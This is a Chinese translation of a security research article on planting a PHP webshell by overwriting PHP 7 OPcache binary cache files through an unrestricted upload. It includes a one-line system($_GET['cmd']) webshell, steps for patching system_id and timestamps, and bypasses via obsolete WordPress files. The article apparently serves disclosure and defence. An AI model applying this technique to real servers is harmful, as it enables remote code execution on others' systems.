> 原文链接: https://www.anquanke.com//post/id/83844 


# 利用PHP 7中的OPcache来实现Webshell


                                阅读量   
                                **143657**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/](http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/)

译文仅供参考，具体内容表达以及含义原文为准

在这篇文章中,我们将会对PHP7 OPcache引擎中的安全问题进行讲解,而且还会给大家介绍一种新型的漏洞利用技术。通过这种攻击方法,我们可以绕过某些安全强化技术,例如[禁止web目录的文件读写](http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html)等安全保障措施。除此之外,攻击者还可以利用这种攻击技术在目标主机中执行恶意代码。<br>

OPcahce

OPcache是PHP 7.0中内嵌的新型缓存引擎。它可以对PHP脚本代码进行编译,并且将编译结果以字节码的形势存入内存中。

OPcache 通过将 PHP 脚本预编译的字节码存储到共享内存中来提升 PHP 的性能, 存储预编译字节码的好处就是省去了每次加载和解析 PHP 脚本的开销。



[![](https://p4.ssl.qhimg.com/t0165a739e4f4503d00.png)](https://p4.ssl.qhimg.com/t0165a739e4f4503d00.png)

除此之外,它还能提供文件系统的缓存功能,但是我们必须在PHP.ini配置文件中定义缓存信息的目标文件夹路径:

opcache.file_cache=/tmp/opcache

在上面这个文件夹中,OPcache会将编译好的PHP脚本保存在相应PHP脚本的相同目录结构之中。比如说,需要进行编译的代码保存在/var/www/index.php之中,而完成编译的代码将会保存在/tmp/opcache/[system_id]/var/www/index.php.bin之中。

在上述文件路径中,system_id是一个包含了当前PHP版本信息,Zend框架的扩展ID,以及各种数据类型信息的MD5 哈希值。在最新发行版的Ubuntu操作系统(16.04)之中,system_id是由当前Zend框架和PHP的版本号所组成的(81d80d78c6ef96b89afaadc7ffc5d7ea)。当OPcache首次对这些文件进行缓存处理时,会在文件系统中创建相应的目录。

正如我们将会在接下来的章节中看到的,每一个OPcache文件还会在文件的header域中保存system_id的副本。

至此,我们就不得不提到OPcache文件夹了,其中一个非常有趣的地方就是,当用户启用了这项服务之后,用户就会拥有OPcache生成的所有文件夹或者文件(所有文件和文件夹均位于/tmp/opcache/目录之下)的写入权限。

OPcache文件夹中的权限信息如下所示:

$ ls /tmp/opcache/

drwx—— 4 www-data www-data 4096 Apr 26 09:16 81d80d78c6ef96b89afaadc7ffc5d7ea

正如我们看到的那样,www-data分组下的用户都拥有OPcache所生成文件夹的写入权限。如果我们拥有OPcache目录的写入权限,那么我们就可以重写目录中的缓存文件,然后利用webshell来执行任意代码。

攻击场景

首先,我们必须得到缓存文件夹的保存路径(/tmp/opcache/[system_id]),以及目标PHP文件的保存路径(/var/www/…)。

为了让大家更容易理解,我们假设网站目录中存在一个phpinfo()文件,我们可以从这个文件中获取到缓存文件夹和文件源代码的存储位置,当我们在计算system_id的时候将会需要用到这些数据。我们已经开发出了一款能够从网站phpinfo()中提取信息,并计算system_id的工具。你可以在我们的[GitHub代码库](https://github.com/GoSecure/php7-opcache-override)中获取到这个工具。

在此,我们需要注意的是,目标网站必须不能对上传的文件有所限制。

现在,我们假设php.ini中除了默认的设置信息之外,还添加有下列配置数据:

opcache.validate_timestamp = 0    ; PHP 7's default is 1

opcache.file_cache_only = 1       ; PHP 7's default is 0

opcache.file_cache = /tmp/opcache

接下来,我们就会给大家讲解攻击的实施过程:

我们已经在网站中找到了一个漏洞,这个漏洞意味着网站不会对我们上传的文件进行任何的限制。我们的目标就是利用包含后门的恶意代码替换掉文件/tmp/opcache/[system_id]/var/www/index.php.bin。



[![](https://p4.ssl.qhimg.com/t01a674691d39bd9194.png)](https://p4.ssl.qhimg.com/t01a674691d39bd9194.png)

上图显示的就是包含漏洞的网站界面。

1.在本地创建一个包含Webshell的恶意PHP文件,将其命名为“index.php”:

&lt;?php

   system($_GET['cmd']);

?&gt;

2.将opcache.file_cache的相关设置添加进你的PHP.ini文件之中。

3.利用php –S 127.0.0.1:8080命令启动一个Web服务器,然后向服务器请求index.php文件,并触发缓存引擎。在这一步中,我们只需要使用命令wget 127.0.0.1:8080就可以实现我们的目的了。

4.定位到我们在第一步中设置的缓存文件夹,你将会发现了一个名为index.php.bin的文件。这个文件就是已经经过编译处理的webshell。



[![](https://p4.ssl.qhimg.com/t017c03b0a1e9411c33.png)](https://p4.ssl.qhimg.com/t017c03b0a1e9411c33.png)

上图显示的是OPcache生成的index.php.bin。

5.由于本地system_id很可能与目标主机的system_id不同,所以我们必须打开index.php.bin文件,并将我们的system_id修改成目标主机的system_id。正如我们之前所提到的,system_id是有可能被猜到的,例如暴力破解,或者根据phpinfo()文件中的服务器信息计算出来。我们可以在文件签名数据之后修改system_id,具体如下图所示:



[![](https://p5.ssl.qhimg.com/t01e01c781cd06c9537.png)](https://p5.ssl.qhimg.com/t01e01c781cd06c9537.png)

上图显示的是system_id的数据存储位置。

6.由于目标网站对上传的文件没有任何的限制,所以我们现在就将文件上传至服务器的目录之中:

/tmp/opcache/[system_id]/var/www/index.php.bin

7.刷新网站的index.php,网站将会自动执行我们的webshell。



[![](https://p3.ssl.qhimg.com/t0132bfcba6e8455a6a.png)](https://p3.ssl.qhimg.com/t0132bfcba6e8455a6a.png)

绕过内存缓存(file_cache_only = 0)

如果内存缓存的优先级高于文件缓存,那么重写OPcache文件并不会执行我们的webshell。如果服务器托管的网站中存在文件上传限制漏洞,那么在服务器重启之后,我们就可以绕过这种限制。既然内存缓存可以被清空,OPcache将会使用文件缓存来填充内存缓存,从而达到我们执行webshell的目的。

这也就意味着,我们还是有办法能够在服务器不进行重启的情况下,执行我们的webshell。

在WordPress等网站框架之中,还是会有一些过时的文件可以公开访问到,例如[registration-functions.php](https://github.com/WordPress/WordPress/blob/703d5bdc8deb17781e9c6d8f0dd7e2c6b6353885/wp-includes/registration-functions.php)。

由于这些文件已经过时了,所以系统不会再加载这些文件,这也就意味着,内存和文件系统的缓存中是不可能存在有这些文件的。当我们上传了恶意代码(registration-functions.php.bin)之后,然后访问相关的网页(/wp-includes/registration-functions.php),OPcache就会自动执行我们的webshell。

绕过时间戳认证(validate_timestamps = 1)

时间戳通常是一个字符序列,它可以唯一地标识某一时刻的时间。一般来说,时间戳产生的过程为:用户首先将需要加时间戳的文件用Hash编码加密形成摘要,然后将该摘要发送到DTS,DTS在加入了收到文件摘要的日期和时间信息后再对该文件加密(数字签名),然后送回用户。

如果服务器启用了时间戳认证功能,OPcache将会对被请求的PHP源文件的时间戳进行验证,如果该文件与缓存文件header域中的时间戳相匹配,那么服务器就会允许访问。如果时间戳不匹配,那么缓存文件将会被丢弃,并创建出一个新的缓存文件。为了绕过这种限制,攻击者必须知道目标源文件的时间戳。

这也就意味着,在WordPress等网站框架之中,源文件的时间戳是可以获取到的,因为当开发人员将代码文件从压缩包中解压出来之后,时间戳信息仍然是保持不变的。



[![](https://p1.ssl.qhimg.com/t01c13058709e314202.png)](https://p1.ssl.qhimg.com/t01c13058709e314202.png)

上图显示的是WordPress/wp-includes文件夹中的信息。

有趣的是,其中的有些文件从2012年起就再也没有进行过任何的修改(请注意以下两个文件:registration-functions.php和registration.php)。因此,即使是不同版本的WordPress,这些相同文件的时间戳也是一样的。在获取到了文件时间戳的信息之后,攻击者就可以修改他们的恶意代码,并且成功覆盖服务器的缓存数据。时间戳信息位于文件开头处的第34字节位置:



[![](https://p4.ssl.qhimg.com/t0124ed000b9a55ec8b.png)](https://p4.ssl.qhimg.com/t0124ed000b9a55ec8b.png)

演示视频

在此,我们给大家提供了一个简短的演示视频,并在视频中对攻击步骤进行了讲解:

视频地址:https://youtu.be/x42l-PQHhbA

正如我们在此之前提到的,大家可以在我们的[GitHub代码库](https://github.com/GoSecure/php7-opcache-override)中获取到你们所需要的工具。

总结

总而言之,这种新型的攻击方法并不会对使用PHP进行开发的应用程序产生影响,因为这并不是PHP的通用漏洞。现在,很多Linux发行版的操作系统(例如Ubuntu 16.04)都会默认安装PHP 7,所以当我们在了解到了这种攻击技术之后,在我们的开发过程中,更加因该谨慎地审查我们的代码,并检查网站中是否存在文件上传限制漏洞,因为这个漏洞将会对服务器的安全产生影响。
